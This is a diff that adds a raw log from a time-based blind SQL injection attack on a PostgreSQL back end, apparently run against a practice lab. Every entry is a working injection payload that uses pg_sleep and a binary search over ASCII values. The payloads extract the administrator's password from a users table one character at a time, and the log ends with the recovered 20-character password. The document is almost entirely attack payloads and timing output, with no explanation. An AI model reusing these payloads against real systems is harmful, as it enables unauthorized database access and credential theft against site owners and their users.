@@ -1,0 +1,378 @@
+Starting get password data with binary search: 
+end_time(12594.621916) - start_time(12592.177027) = 2.444889
+end_time(12608.914490) - start_time(12594.622066) = 14.292424
+(0, 46, 93) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),1,1)) > 80) then pg_sleep(10) else null end is null)--+
+end_time(12611.526176) - start_time(12608.914695) = 2.611481
+end_time(12624.111230) - start_time(12611.526277) = 12.584953
+(47, 70, 93) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),1,1)) > 105) then pg_sleep(10) else null end is null)--+
+end_time(12626.711229) - start_time(12624.111431) = 2.599798
+end_time(12639.656904) - start_time(12626.711329) = 12.945575
+(71, 82, 93) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),1,1)) > 117) then pg_sleep(10) else null end is null)--+
+end_time(12643.320824) - start_time(12639.657094) = 3.663730
+end_time(12645.837785) - start_time(12643.320928) = 2.516857
+(83, 88, 93) ---> OPPOSITE : ' and (select case when (ascii(substr((select password from users where username='administrator'),1,1)) > 123) then pg_sleep(10) else null end is null)--+
+end_time(12649.919448) - start_time(12645.837903) = 4.081546
+end_time(12653.068194) - start_time(12649.919550) = 3.148645
+(83, 85, 87) ---> OPPOSITE : ' and (select case when (ascii(substr((select password from users where username='administrator'),1,1)) > 120) then pg_sleep(10) else null end is null)--+
+end_time(12665.480363) - start_time(12653.068389) = 12.411974
+Get the char index successfully ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),1,1)) = 118) then pg_sleep(10) else null end is null)--+
+Got the password : v, and its length : 1
+
+end_time(12667.939115) - start_time(12665.480601) = 2.458514
+end_time(12670.821299) - start_time(12667.939220) = 2.882079
+(0, 46, 93) ---> OPPOSITE : ' and (select case when (ascii(substr((select password from users where username='administrator'),2,1)) > 80) then pg_sleep(10) else null end is null)--+
+end_time(12673.174853) - start_time(12670.821492) = 2.353360
+end_time(12687.602901) - start_time(12673.174957) = 14.427944
+(0, 22, 45) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),2,1)) > 54) then pg_sleep(10) else null end is null)--+
+end_time(12691.394256) - start_time(12687.603033) = 3.791223
+end_time(12693.757251) - start_time(12691.394350) = 2.362902
+(23, 34, 45) ---> OPPOSITE : ' and (select case when (ascii(substr((select password from users where username='administrator'),2,1)) > 68) then pg_sleep(10) else null end is null)--+
+end_time(12696.123176) - start_time(12693.757333) = 2.365843
+end_time(12698.552835) - start_time(12696.123278) = 2.429556
+(23, 28, 33) ---> OPPOSITE : ' and (select case when (ascii(substr((select password from users where username='administrator'),2,1)) > 61) then pg_sleep(10) else null end is null)--+
+end_time(12701.111351) - start_time(12698.553022) = 2.558329
+end_time(12704.001788) - start_time(12701.111428) = 2.890360
+(23, 25, 27) ---> OPPOSITE : ' and (select case when (ascii(substr((select password from users where username='administrator'),2,1)) > 57) then pg_sleep(10) else null end is null)--+
+end_time(12716.342730) - start_time(12704.001934) = 12.340796
+Get the char index successfully ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),2,1)) = 55) then pg_sleep(10) else null end is null)--+
+Got the password : v7, and its length : 2
+
+end_time(12719.057452) - start_time(12716.342836) = 2.714616
+end_time(12721.296174) - start_time(12719.057531) = 2.238643
+(0, 46, 93) ---> OPPOSITE : ' and (select case when (ascii(substr((select password from users where username='administrator'),3,1)) > 80) then pg_sleep(10) else null end is null)--+
+end_time(12724.151337) - start_time(12721.296304) = 2.855033
+end_time(12727.107181) - start_time(12724.151419) = 2.955762
+(0, 22, 45) ---> OPPOSITE : ' and (select case when (ascii(substr((select password from users where username='administrator'),3,1)) > 54) then pg_sleep(10) else null end is null)--+
+end_time(12729.476008) - start_time(12727.107382) = 2.368626
+end_time(12741.766435) - start_time(12729.476110) = 12.290324
+(0, 10, 21) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),3,1)) > 42) then pg_sleep(10) else null end is null)--+
+end_time(12744.123382) - start_time(12741.766627) = 2.356755
+end_time(12757.329400) - start_time(12744.123469) = 13.205931
+(11, 16, 21) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),3,1)) > 48) then pg_sleep(10) else null end is null)--+
+end_time(12760.234501) - start_time(12757.329545) = 2.904955
+end_time(12762.579184) - start_time(12760.234594) = 2.344590
+(17, 19, 21) ---> OPPOSITE : ' and (select case when (ascii(substr((select password from users where username='administrator'),3,1)) > 51) then pg_sleep(10) else null end is null)--+
+end_time(12765.116177) - start_time(12762.579385) = 2.536792
+end_time(12777.604514) - start_time(12765.116214) = 12.488300
+(17, 17, 18) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),3,1)) > 49) then pg_sleep(10) else null end is null)--+
+end_time(12790.838370) - start_time(12777.604626) = 13.233744
+Get the char index successfully ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),3,1)) = 50) then pg_sleep(10) else null end is null)--+
+Got the password : v72, and its length : 3
+
+end_time(12793.188758) - start_time(12790.838478) = 2.350280
+end_time(12805.667715) - start_time(12793.188857) = 12.478858
+(0, 46, 93) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),4,1)) > 80) then pg_sleep(10) else null end is null)--+
+end_time(12807.914540) - start_time(12805.667909) = 2.246631
+end_time(12820.814622) - start_time(12807.914619) = 12.900003
+(47, 70, 93) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),4,1)) > 105) then pg_sleep(10) else null end is null)--+
+end_time(12823.172945) - start_time(12820.814681) = 2.358264
+end_time(12836.138712) - start_time(12823.173061) = 12.965651
+(71, 82, 93) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),4,1)) > 117) then pg_sleep(10) else null end is null)--+
+end_time(12838.559576) - start_time(12836.138912) = 2.420664
+end_time(12840.945329) - start_time(12838.559662) = 2.385667
+(83, 88, 93) ---> OPPOSITE : ' and (select case when (ascii(substr((select password from users where username='administrator'),4,1)) > 123) then pg_sleep(10) else null end is null)--+
+end_time(12844.691871) - start_time(12840.945463) = 3.746408
+end_time(12857.302521) - start_time(12844.691933) = 12.610588
+(83, 85, 87) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),4,1)) > 120) then pg_sleep(10) else null end is null)--+
+end_time(12860.275018) - start_time(12857.302717) = 2.972301
+end_time(12872.939905) - start_time(12860.275129) = 12.664776
+(86, 86, 87) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),4,1)) > 121) then pg_sleep(10) else null end is null)--+
+end_time(12885.437558) - start_time(12872.940037) = 12.497522
+Get the char index successfully ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),4,1)) = 122) then pg_sleep(10) else null end is null)--+
+Got the password : v72z, and its length : 4
+
+end_time(12887.890576) - start_time(12885.437802) = 2.452774
+end_time(12900.382977) - start_time(12887.890673) = 12.492304
+(0, 46, 93) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),5,1)) > 80) then pg_sleep(10) else null end is null)--+
+end_time(12902.844032) - start_time(12900.383164) = 2.460868
+end_time(12915.719582) - start_time(12902.844143) = 12.875438
+(47, 70, 93) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),5,1)) > 105) then pg_sleep(10) else null end is null)--+
+end_time(12918.713892) - start_time(12915.719777) = 2.994115
+end_time(12931.103205) - start_time(12918.713998) = 12.389207
+(71, 82, 93) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),5,1)) > 117) then pg_sleep(10) else null end is null)--+
+end_time(12933.473759) - start_time(12931.103345) = 2.370414
+end_time(12936.445486) - start_time(12933.473849) = 2.971637
+(83, 88, 93) ---> OPPOSITE : ' and (select case when (ascii(substr((select password from users where username='administrator'),5,1)) > 123) then pg_sleep(10) else null end is null)--+
+end_time(12949.548173) - start_time(12936.445683) = 13.102490
+Get the char index successfully ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),5,1)) = 120) then pg_sleep(10) else null end is null)--+
+Got the password : v72zx, and its length : 5
+
+end_time(12952.448889) - start_time(12949.548402) = 2.900486
+end_time(12965.737146) - start_time(12952.448932) = 13.288214
+(0, 46, 93) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),6,1)) > 80) then pg_sleep(10) else null end is null)--+
+end_time(12979.128958) - start_time(12965.737275) = 13.391684
+Get the char index successfully ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),6,1)) = 105) then pg_sleep(10) else null end is null)--+
+Got the password : v72zxi, and its length : 6
+
+end_time(12981.951176) - start_time(12979.129193) = 2.821983
+end_time(12984.196765) - start_time(12981.951282) = 2.245483
+(0, 46, 93) ---> OPPOSITE : ' and (select case when (ascii(substr((select password from users where username='administrator'),7,1)) > 80) then pg_sleep(10) else null end is null)--+
+end_time(12986.607968) - start_time(12984.196963) = 2.411006
+end_time(12990.496715) - start_time(12986.608084) = 3.888631
+(0, 22, 45) ---> OPPOSITE : ' and (select case when (ascii(substr((select password from users where username='administrator'),7,1)) > 54) then pg_sleep(10) else null end is null)--+
+end_time(12992.751389) - start_time(12990.496862) = 2.254527
+end_time(13005.794702) - start_time(12992.751497) = 13.043205
+(0, 10, 21) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),7,1)) > 42) then pg_sleep(10) else null end is null)--+
+end_time(13008.211821) - start_time(13005.794810) = 2.417011
+end_time(13021.727128) - start_time(13008.211931) = 13.515197
+(11, 16, 21) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),7,1)) > 48) then pg_sleep(10) else null end is null)--+
+end_time(13034.117996) - start_time(13021.727327) = 12.390668
+Get the char index successfully ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),7,1)) = 51) then pg_sleep(10) else null end is null)--+
+Got the password : v72zxi3, and its length : 7
+
+end_time(13036.483654) - start_time(13034.118232) = 2.365422
+end_time(13038.933435) - start_time(13036.483766) = 2.449669
+(0, 46, 93) ---> OPPOSITE : ' and (select case when (ascii(substr((select password from users where username='administrator'),8,1)) > 80) then pg_sleep(10) else null end is null)--+
+end_time(13041.308561) - start_time(13038.933576) = 2.374985
+end_time(13044.936911) - start_time(13041.308667) = 3.628244
+(0, 22, 45) ---> OPPOSITE : ' and (select case when (ascii(substr((select password from users where username='administrator'),8,1)) > 54) then pg_sleep(10) else null end is null)--+
+end_time(13049.531293) - start_time(13044.937114) = 4.594180
+end_time(13061.872234) - start_time(13049.531420) = 12.340813
+(0, 10, 21) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),8,1)) > 42) then pg_sleep(10) else null end is null)--+
+end_time(13065.016802) - start_time(13061.872430) = 3.144372
+end_time(13077.433966) - start_time(13065.016877) = 12.417089
+(11, 16, 21) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),8,1)) > 48) then pg_sleep(10) else null end is null)--+
+end_time(13080.406970) - start_time(13077.434166) = 2.972804
+end_time(13092.896569) - start_time(13080.407085) = 12.489484
+(17, 19, 21) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),8,1)) > 51) then pg_sleep(10) else null end is null)--+
+end_time(13096.796725) - start_time(13092.896760) = 3.899966
+end_time(13109.817447) - start_time(13096.796838) = 13.020609
+(20, 20, 21) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),8,1)) > 52) then pg_sleep(10) else null end is null)--+
+end_time(13122.588820) - start_time(13109.817646) = 12.771174
+Get the char index successfully ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),8,1)) = 53) then pg_sleep(10) else null end is null)--+
+Got the password : v72zxi35, and its length : 8
+
+end_time(13126.175235) - start_time(13122.588951) = 3.586284
+end_time(13141.068279) - start_time(13126.175338) = 14.892941
+(0, 46, 93) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),9,1)) > 80) then pg_sleep(10) else null end is null)--+
+end_time(13143.399989) - start_time(13141.068462) = 2.331527
+end_time(13155.838939) - start_time(13143.400092) = 12.438848
+(47, 70, 93) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),9,1)) > 105) then pg_sleep(10) else null end is null)--+
+end_time(13159.433204) - start_time(13155.839129) = 3.594076
+end_time(13162.947721) - start_time(13159.433321) = 3.514399
+(71, 82, 93) ---> OPPOSITE : ' and (select case when (ascii(substr((select password from users where username='administrator'),9,1)) > 117) then pg_sleep(10) else null end is null)--+
+end_time(13165.770879) - start_time(13162.947929) = 2.822949
+end_time(13178.195493) - start_time(13165.770985) = 12.424508
+(71, 76, 81) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),9,1)) > 111) then pg_sleep(10) else null end is null)--+
+end_time(13180.600542) - start_time(13178.195682) = 2.404859
+end_time(13183.108871) - start_time(13180.600613) = 2.508258
+(77, 79, 81) ---> OPPOSITE : ' and (select case when (ascii(substr((select password from users where username='administrator'),9,1)) > 114) then pg_sleep(10) else null end is null)--+
+end_time(13185.472887) - start_time(13183.109066) = 2.363821
+end_time(13197.755383) - start_time(13185.472960) = 12.282423
+(77, 77, 78) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),9,1)) > 112) then pg_sleep(10) else null end is null)--+
+end_time(13210.143363) - start_time(13197.755575) = 12.387788
+Get the char index successfully ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),9,1)) = 113) then pg_sleep(10) else null end is null)--+
+Got the password : v72zxi35q, and its length : 9
+
+end_time(13212.613048) - start_time(13210.143591) = 2.469457
+end_time(13226.118322) - start_time(13212.613153) = 13.505168
+(0, 46, 93) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),10,1)) > 80) then pg_sleep(10) else null end is null)--+
+end_time(13229.385363) - start_time(13226.118517) = 3.266846
+end_time(13232.987964) - start_time(13229.385443) = 3.602521
+(47, 70, 93) ---> OPPOSITE : ' and (select case when (ascii(substr((select password from users where username='administrator'),10,1)) > 105) then pg_sleep(10) else null end is null)--+
+end_time(13235.299343) - start_time(13232.988127) = 2.311216
+end_time(13248.135365) - start_time(13235.299450) = 12.835915
+(47, 58, 69) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),10,1)) > 92) then pg_sleep(10) else null end is null)--+
+end_time(13251.564098) - start_time(13248.135561) = 3.428537
+end_time(13263.971461) - start_time(13251.564200) = 12.407262
+(59, 64, 69) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),10,1)) > 99) then pg_sleep(10) else null end is null)--+
+end_time(13266.341874) - start_time(13263.971607) = 2.370267
+end_time(13281.112096) - start_time(13266.341983) = 14.770113
+(65, 67, 69) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),10,1)) > 102) then pg_sleep(10) else null end is null)--+
+end_time(13293.501728) - start_time(13281.112283) = 12.389445
+Get the char index successfully ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),10,1)) = 103) then pg_sleep(10) else null end is null)--+
+Got the password : v72zxi35qg, and its length : 10
+
+end_time(13296.109948) - start_time(13293.501974) = 2.607974
+end_time(13308.550245) - start_time(13296.110052) = 12.440193
+(0, 46, 93) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),11,1)) > 80) then pg_sleep(10) else null end is null)--+
+end_time(13311.638555) - start_time(13308.550442) = 3.088113
+end_time(13314.080053) - start_time(13311.638605) = 2.441448
+(47, 70, 93) ---> OPPOSITE : ' and (select case when (ascii(substr((select password from users where username='administrator'),11,1)) > 105) then pg_sleep(10) else null end is null)--+
+end_time(13317.244594) - start_time(13314.080249) = 3.164344
+end_time(13333.327682) - start_time(13317.244641) = 16.083041
+(47, 58, 69) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),11,1)) > 92) then pg_sleep(10) else null end is null)--+
+end_time(13335.714421) - start_time(13333.327890) = 2.386531
+end_time(13350.526882) - start_time(13335.714529) = 14.812353
+(59, 64, 69) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),11,1)) > 99) then pg_sleep(10) else null end is null)--+
+end_time(13353.669834) - start_time(13350.527075) = 3.142759
+end_time(13366.098832) - start_time(13353.669948) = 12.428884
+(65, 67, 69) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),11,1)) > 102) then pg_sleep(10) else null end is null)--+
+end_time(13379.855696) - start_time(13366.099030) = 13.756666
+Get the char index successfully ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),11,1)) = 103) then pg_sleep(10) else null end is null)--+
+Got the password : v72zxi35qgg, and its length : 11
+
+end_time(13382.858549) - start_time(13379.855945) = 3.002604
+end_time(13385.350524) - start_time(13382.858652) = 2.491872
+(0, 46, 93) ---> OPPOSITE : ' and (select case when (ascii(substr((select password from users where username='administrator'),12,1)) > 80) then pg_sleep(10) else null end is null)--+
+end_time(13388.021411) - start_time(13385.350721) = 2.670690
+end_time(13390.368063) - start_time(13388.021515) = 2.346548
+(0, 22, 45) ---> OPPOSITE : ' and (select case when (ascii(substr((select password from users where username='administrator'),12,1)) > 54) then pg_sleep(10) else null end is null)--+
+end_time(13392.618419) - start_time(13390.368261) = 2.250158
+end_time(13405.011436) - start_time(13392.618528) = 12.392908
+(0, 10, 21) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),12,1)) > 42) then pg_sleep(10) else null end is null)--+
+end_time(13407.752557) - start_time(13405.011622) = 2.740935
+end_time(13420.270565) - start_time(13407.752669) = 12.517896
+(11, 16, 21) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),12,1)) > 48) then pg_sleep(10) else null end is null)--+
+end_time(13432.763133) - start_time(13420.270759) = 12.492374
+Get the char index successfully ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),12,1)) = 51) then pg_sleep(10) else null end is null)--+
+Got the password : v72zxi35qgg3, and its length : 12
+
+end_time(13435.322052) - start_time(13432.763359) = 2.558693
+end_time(13447.814598) - start_time(13435.322153) = 12.492445
+(0, 46, 93) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),13,1)) > 80) then pg_sleep(10) else null end is null)--+
+end_time(13450.190237) - start_time(13447.814787) = 2.375450
+end_time(13462.599117) - start_time(13450.190355) = 12.408762
+(47, 70, 93) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),13,1)) > 105) then pg_sleep(10) else null end is null)--+
+end_time(13465.749489) - start_time(13462.599277) = 3.150212
+end_time(13468.703925) - start_time(13465.749601) = 2.954324
+(71, 82, 93) ---> OPPOSITE : ' and (select case when (ascii(substr((select password from users where username='administrator'),13,1)) > 117) then pg_sleep(10) else null end is null)--+
+end_time(13471.170017) - start_time(13468.703988) = 2.466029
+end_time(13473.517132) - start_time(13471.170125) = 2.347007
+(71, 76, 81) ---> OPPOSITE : ' and (select case when (ascii(substr((select password from users where username='administrator'),13,1)) > 111) then pg_sleep(10) else null end is null)--+
+end_time(13475.890542) - start_time(13473.517328) = 2.373214
+end_time(13478.228067) - start_time(13475.890607) = 2.337459
+(71, 73, 75) ---> OPPOSITE : ' and (select case when (ascii(substr((select password from users where username='administrator'),13,1)) > 108) then pg_sleep(10) else null end is null)--+
+end_time(13480.920111) - start_time(13478.228227) = 2.691884
+end_time(13493.280592) - start_time(13480.920189) = 12.360404
+(71, 71, 72) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),13,1)) > 106) then pg_sleep(10) else null end is null)--+
+end_time(13505.750181) - start_time(13493.280792) = 12.469389
+Get the char index successfully ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),13,1)) = 107) then pg_sleep(10) else null end is null)--+
+Got the password : v72zxi35qgg3k, and its length : 13
+
+end_time(13508.744264) - start_time(13505.750413) = 2.993851
+end_time(13521.541816) - start_time(13508.744371) = 12.797445
+(0, 46, 93) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),14,1)) > 80) then pg_sleep(10) else null end is null)--+
+end_time(13523.895565) - start_time(13521.541970) = 2.353595
+end_time(13527.379628) - start_time(13523.895675) = 3.483953
+(47, 70, 93) ---> OPPOSITE : ' and (select case when (ascii(substr((select password from users where username='administrator'),14,1)) > 105) then pg_sleep(10) else null end is null)--+
+end_time(13530.247794) - start_time(13527.379828) = 2.867966
+end_time(13542.945486) - start_time(13530.247870) = 12.697616
+(47, 58, 69) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),14,1)) > 92) then pg_sleep(10) else null end is null)--+
+end_time(13546.050794) - start_time(13542.945677) = 3.105117
+end_time(13558.713384) - start_time(13546.050896) = 12.662489
+(59, 64, 69) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),14,1)) > 99) then pg_sleep(10) else null end is null)--+
+end_time(13560.973584) - start_time(13558.713571) = 2.260013
+end_time(13573.357637) - start_time(13560.973698) = 12.383939
+(65, 67, 69) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),14,1)) > 102) then pg_sleep(10) else null end is null)--+
+end_time(13575.725288) - start_time(13573.357830) = 2.367458
+end_time(13588.308273) - start_time(13575.725393) = 12.582880
+(68, 68, 69) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),14,1)) > 103) then pg_sleep(10) else null end is null)--+
+end_time(13600.728445) - start_time(13588.308458) = 12.419987
+Get the char index successfully ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),14,1)) = 104) then pg_sleep(10) else null end is null)--+
+Got the password : v72zxi35qgg3kh, and its length : 14
+
+end_time(13603.179751) - start_time(13600.728679) = 2.451072
+end_time(13606.203074) - start_time(13603.179856) = 3.023218
+(0, 46, 93) ---> OPPOSITE : ' and (select case when (ascii(substr((select password from users where username='administrator'),15,1)) > 80) then pg_sleep(10) else null end is null)--+
+end_time(13619.130213) - start_time(13606.203282) = 12.926931
+Get the char index successfully ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),15,1)) = 54) then pg_sleep(10) else null end is null)--+
+Got the password : v72zxi35qgg3kh6, and its length : 15
+
+end_time(13621.482902) - start_time(13619.130383) = 2.352519
+end_time(13634.080579) - start_time(13621.483016) = 12.597563
+(0, 46, 93) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),16,1)) > 80) then pg_sleep(10) else null end is null)--+
+end_time(13636.972797) - start_time(13634.080773) = 2.892024
+end_time(13650.260120) - start_time(13636.972903) = 13.287217
+(47, 70, 93) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),16,1)) > 105) then pg_sleep(10) else null end is null)--+
+end_time(13652.585708) - start_time(13650.260231) = 2.325477
+end_time(13665.004053) - start_time(13652.585785) = 12.418268
+(71, 82, 93) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),16,1)) > 117) then pg_sleep(10) else null end is null)--+
+end_time(13667.307562) - start_time(13665.004242) = 2.303320
+end_time(13669.741224) - start_time(13667.307668) = 2.433557
+(83, 88, 93) ---> OPPOSITE : ' and (select case when (ascii(substr((select password from users where username='administrator'),16,1)) > 123) then pg_sleep(10) else null end is null)--+
+end_time(13672.129512) - start_time(13669.741430) = 2.388082
+end_time(13674.681454) - start_time(13672.129592) = 2.551862
+(83, 85, 87) ---> OPPOSITE : ' and (select case when (ascii(substr((select password from users where username='administrator'),16,1)) > 120) then pg_sleep(10) else null end is null)--+
+end_time(13677.391258) - start_time(13674.681650) = 2.709607
+end_time(13689.913945) - start_time(13677.391366) = 12.522580
+(83, 83, 84) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),16,1)) > 118) then pg_sleep(10) else null end is null)--+
+end_time(13702.279830) - start_time(13689.914149) = 12.365681
+Get the char index successfully ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),16,1)) = 119) then pg_sleep(10) else null end is null)--+
+Got the password : v72zxi35qgg3kh6w, and its length : 16
+
+end_time(13705.173621) - start_time(13702.280072) = 2.893549
+end_time(13707.585632) - start_time(13705.173736) = 2.411897
+(0, 46, 93) ---> OPPOSITE : ' and (select case when (ascii(substr((select password from users where username='administrator'),17,1)) > 80) then pg_sleep(10) else null end is null)--+
+end_time(13709.967596) - start_time(13707.585826) = 2.381771
+end_time(13722.861981) - start_time(13709.967704) = 12.894276
+(0, 22, 45) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),17,1)) > 54) then pg_sleep(10) else null end is null)--+
+end_time(13725.419363) - start_time(13722.862112) = 2.557251
+end_time(13728.001152) - start_time(13725.419476) = 2.581676
+(23, 34, 45) ---> OPPOSITE : ' and (select case when (ascii(substr((select password from users where username='administrator'),17,1)) > 68) then pg_sleep(10) else null end is null)--+
+end_time(13730.365523) - start_time(13728.001348) = 2.364175
+end_time(13732.641296) - start_time(13730.365629) = 2.275667
+(23, 28, 33) ---> OPPOSITE : ' and (select case when (ascii(substr((select password from users where username='administrator'),17,1)) > 61) then pg_sleep(10) else null end is null)--+
+end_time(13735.566127) - start_time(13732.641564) = 2.924563
+end_time(13738.561311) - start_time(13735.566210) = 2.995102
+(23, 25, 27) ---> OPPOSITE : ' and (select case when (ascii(substr((select password from users where username='administrator'),17,1)) > 57) then pg_sleep(10) else null end is null)--+
+end_time(13740.931888) - start_time(13738.561515) = 2.370374
+end_time(13753.377285) - start_time(13740.931989) = 12.445296
+(23, 23, 24) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),17,1)) > 55) then pg_sleep(10) else null end is null)--+
+end_time(13765.772067) - start_time(13753.377476) = 12.394591
+Get the char index successfully ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),17,1)) = 56) then pg_sleep(10) else null end is null)--+
+Got the password : v72zxi35qgg3kh6w8, and its length : 17
+
+end_time(13768.145566) - start_time(13765.772299) = 2.373267
+end_time(13780.723500) - start_time(13768.145677) = 12.577823
+(0, 46, 93) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),18,1)) > 80) then pg_sleep(10) else null end is null)--+
+end_time(13784.325179) - start_time(13780.723695) = 3.601484
+end_time(13796.999929) - start_time(13784.325287) = 12.674642
+(47, 70, 93) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),18,1)) > 105) then pg_sleep(10) else null end is null)--+
+end_time(13800.495716) - start_time(13797.000124) = 3.495592
+end_time(13802.961248) - start_time(13800.495826) = 2.465422
+(71, 82, 93) ---> OPPOSITE : ' and (select case when (ascii(substr((select password from users where username='administrator'),18,1)) > 117) then pg_sleep(10) else null end is null)--+
+end_time(13805.802986) - start_time(13802.961446) = 2.841539
+end_time(13818.298912) - start_time(13805.803086) = 12.495826
+(71, 76, 81) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),18,1)) > 111) then pg_sleep(10) else null end is null)--+
+end_time(13821.086000) - start_time(13818.299104) = 2.786897
+end_time(13823.441503) - start_time(13821.086080) = 2.355423
+(77, 79, 81) ---> OPPOSITE : ' and (select case when (ascii(substr((select password from users where username='administrator'),18,1)) > 114) then pg_sleep(10) else null end is null)--+
+end_time(13836.459984) - start_time(13823.441702) = 13.018281
+Get the char index successfully ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),18,1)) = 112) then pg_sleep(10) else null end is null)--+
+Got the password : v72zxi35qgg3kh6w8p, and its length : 18
+
+end_time(13838.908141) - start_time(13836.460223) = 2.447919
+end_time(13851.349060) - start_time(13838.908249) = 12.440812
+(0, 46, 93) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),19,1)) > 80) then pg_sleep(10) else null end is null)--+
+end_time(13853.806702) - start_time(13851.349263) = 2.457439
+end_time(13866.123381) - start_time(13853.806816) = 12.316565
+(47, 70, 93) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),19,1)) > 105) then pg_sleep(10) else null end is null)--+
+end_time(13868.888996) - start_time(13866.123578) = 2.765418
+end_time(13881.169910) - start_time(13868.889101) = 12.280810
+(71, 82, 93) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),19,1)) > 117) then pg_sleep(10) else null end is null)--+
+end_time(13883.536192) - start_time(13881.170058) = 2.366134
+end_time(13886.607413) - start_time(13883.536297) = 3.071117
+(83, 88, 93) ---> OPPOSITE : ' and (select case when (ascii(substr((select password from users where username='administrator'),19,1)) > 123) then pg_sleep(10) else null end is null)--+
+end_time(13888.955332) - start_time(13886.607616) = 2.347717
+end_time(13891.301510) - start_time(13888.955441) = 2.346070
+(83, 85, 87) ---> OPPOSITE : ' and (select case when (ascii(substr((select password from users where username='administrator'),19,1)) > 120) then pg_sleep(10) else null end is null)--+
+end_time(13893.558717) - start_time(13891.301714) = 2.257003
+end_time(13906.083886) - start_time(13893.558832) = 12.525055
+(83, 83, 84) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),19,1)) > 118) then pg_sleep(10) else null end is null)--+
+end_time(13918.446447) - start_time(13906.084018) = 12.362430
+Get the char index successfully ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),19,1)) = 119) then pg_sleep(10) else null end is null)--+
+Got the password : v72zxi35qgg3kh6w8pw, and its length : 19
+
+end_time(13920.727907) - start_time(13918.446689) = 2.281218
+end_time(13923.264870) - start_time(13920.728014) = 2.536856
+(0, 46, 93) ---> OPPOSITE : ' and (select case when (ascii(substr((select password from users where username='administrator'),20,1)) > 80) then pg_sleep(10) else null end is null)--+
+end_time(13925.713526) - start_time(13923.265070) = 2.448457
+end_time(13928.508075) - start_time(13925.713633) = 2.794442
+(0, 22, 45) ---> OPPOSITE : ' and (select case when (ascii(substr((select password from users where username='administrator'),20,1)) > 54) then pg_sleep(10) else null end is null)--+
+end_time(13930.804803) - start_time(13928.508266) = 2.296537
+end_time(13943.105120) - start_time(13930.804910) = 12.300210
+(0, 10, 21) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),20,1)) > 42) then pg_sleep(10) else null end is null)--+
+end_time(13945.505374) - start_time(13943.105314) = 2.400060
+end_time(13957.803916) - start_time(13945.505474) = 12.298443
+(11, 16, 21) ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),20,1)) > 48) then pg_sleep(10) else null end is null)--+
+end_time(13970.361088) - start_time(13957.804108) = 12.556980
+Get the char index successfully ---> ' and (select case when (ascii(substr((select password from users where username='administrator'),20,1)) = 51) then pg_sleep(10) else null end is null)--+
+Got the password : v72zxi35qgg3kh6w8pw3, and its length : 20
+
+The final password is : v72zxi35qgg3kh6w8pw3
